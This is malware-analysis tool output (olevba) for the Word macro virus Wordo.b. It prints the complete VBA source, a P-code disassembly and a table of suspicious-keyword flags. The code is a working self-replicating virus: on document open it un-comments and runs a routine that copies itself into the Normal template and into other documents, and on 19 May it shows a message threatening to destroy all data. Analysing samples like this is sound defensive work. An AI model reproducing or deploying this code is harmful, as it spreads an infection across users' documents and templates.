olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wordo.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wordo.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem
Private Sub w()
'Options.VirusProtection = False
'z = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 10)
'If InStr(z, "WORDO2") = 0 Then GoTo 1
'z = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 10)
'If InStr(z, "WORDO2") <> 0 Then
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'ActiveDocument.Saved = True: NormalTemplate.Saved = True: Exit Sub: End If
'pr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, pr
'pr = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 1
'z = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, pr)
'ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString (z)
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 53, 1
'p = Chr(39) + "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
'ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 53, p
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 99, 1
'p = "r = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 45)"
'ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 99, p
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 103, 1
'p = "ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 3, r"
'ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 103, p
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'NormalTemplate.Saved = True
'ActiveDocument.Save
'Exit Sub
'1
'pr = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, pr
'pr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1
'z = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, pr)
'NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString (z)
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 53, 1
'p = Chr(39) + "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
'NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 53, p
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 99, 1
'p = "r = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 45)"
'NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 99, p
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 103, 1
'p = "NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 3, r"
'NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 103, p
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'ActiveDocument.Saved = True
'NormalTemplate.Save
End Sub
Rem
Private Sub Document_Open()
If InStr(Date, "19.5.") <> 0 Then MsgBox "Nazdar!" + Chr(10) + Chr(13) _
+ "Ja som virus WORDO 2.0 a ked sa mi bude chciet, tak znicim vsetky " _
+ "data v tomto pocitaci.", vbExclamation, "VIRUS"
r = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 45)
For i = 1 To Len(r)
If Mid(r, i, 1) = "'" Then Mid(r, i, 1) = " "
Next i
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 3, r
w
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Wordo.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6292 bytes
' Line #0:
' 	Rem 0x0000 ""
' Line #1:
' 	FuncDefn (Private Sub w())
' Line #2:
' 	QuoteRem 0x0000 0x001F "Options.VirusProtection = False"
' Line #3:
' 	QuoteRem 0x0000 0x0044 "z = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 10)"
' Line #4:
' 	QuoteRem 0x0000 0x0025 "If InStr(z, "WORDO2") = 0 Then GoTo 1"
' Line #5:
' 	QuoteRem 0x0000 0x0044 "z = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 10)"
' Line #6:
' 	QuoteRem 0x0000 0x001F "If InStr(z, "WORDO2") <> 0 Then"
' Line #7:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
' Line #8:
' 	QuoteRem 0x0000 0x004A "ActiveDocument.Saved = True: NormalTemplate.Saved = True: Exit Sub: End If"
' Line #9:
' 	QuoteRem 0x0000 0x0045 "pr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines"
' Line #10:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, pr"
' Line #11:
' 	QuoteRem 0x0000 0x0049 "pr = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 1"
' Line #12:
' 	QuoteRem 0x0000 0x0044 "z = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, pr)"
' Line #13:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString (z)"
' Line #14:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 53, 1"
' Line #15:
' 	QuoteRem 0x0000 0x0055 "p = Chr(39) + "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45""
' Line #16:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 53, p"
' Line #17:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 99, 1"
' Line #18:
' 	QuoteRem 0x0000 0x004A "p = "r = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 45)""
' Line #19:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 99, p"
' Line #20:
' 	QuoteRem 0x0000 0x0046 "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 103, 1"
' Line #21:
' 	QuoteRem 0x0000 0x004A "p = "ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 3, r""
' Line #22:
' 	QuoteRem 0x0000 0x0046 "ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 103, p"
' Line #23:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
' Line #24:
' 	QuoteRem 0x0000 0x0045 "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
' Line #25:
' 	QuoteRem 0x0000 0x001B "NormalTemplate.Saved = True"
' Line #26:
' 	QuoteRem 0x0000 0x0013 "ActiveDocument.Save"
' Line #27:
' 	QuoteRem 0x0000 0x0008 "Exit Sub"
' Line #28:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #29:
' 	QuoteRem 0x0000 0x0045 "pr = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines"
' Line #30:
' 	QuoteRem 0x0000 0x0045 "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, pr"
' Line #31:
' 	QuoteRem 0x0000 0x0049 "pr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1"
' Line #32:
' 	QuoteRem 0x0000 0x0044 "z = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, pr)"
' Line #33:
' 	QuoteRem 0x0000 0x0045 "NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString (z)"
' Line #34:
' 	QuoteRem 0x0000 0x0045 "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 53, 1"
' Line #35:
' 	QuoteRem 0x0000 0x0055 "p = Chr(39) + "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45""
' Line #36:
' 	QuoteRem 0x0000 0x0045 "NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 53, p"
' Line #37:
' 	QuoteRem 0x0000 0x0045 "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 99, 1"
' Line #38:
' 	QuoteRem 0x0000 0x004A "p = "r = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 45)""
' Line #39:
' 	QuoteRem 0x0000 0x0045 "NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 99, p"
' Line #40:
' 	QuoteRem 0x0000 0x0046 "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 103, 1"
' Line #41:
' 	QuoteRem 0x0000 0x004A "p = "NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 3, r""
' Line #42:
' 	QuoteRem 0x0000 0x0046 "NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 103, p"
' Line #43:
' 	QuoteRem 0x0000 0x0045 "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
' Line #44:
' 	QuoteRem 0x0000 0x0045 "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
' Line #45:
' 	QuoteRem 0x0000 0x001B "ActiveDocument.Saved = True"
' Line #46:
' 	QuoteRem 0x0000 0x0013 "NormalTemplate.Save"
' Line #47:
' 	EndSub 
' Line #48:
' 	Rem 0x0000 ""
' Line #49:
' 	FuncDefn (Private Sub Document_Open())
' Line #50:
' 	LineCont 0x0008 16 00 00 00 18 00 00 00
' 	Ld Date 
' 	LitStr 0x0005 "19.5."
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "Nazdar!"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0042 "Ja som virus WORDO 2.0 a ked sa mi bude chciet, tak znicim vsetky "
' 	Add 
' 	LitStr 0x0016 "data v tomto pocitaci."
' 	Add 
' 	Ld vbExclamation 
' 	LitStr 0x0005 "VIRUS"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #51:
' 	LitDI2 0x0003 
' 	LitDI2 0x002D 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St r 
' Line #52:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld r 
' 	FnLen 
' 	For 
' Line #53:
' 	Ld r 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 " "
' 	Ld r 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Mid 
' 	EndIf 
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	LitDI2 0x0003 
' 	Ld r 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #56:
' 	ArgsCall w 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

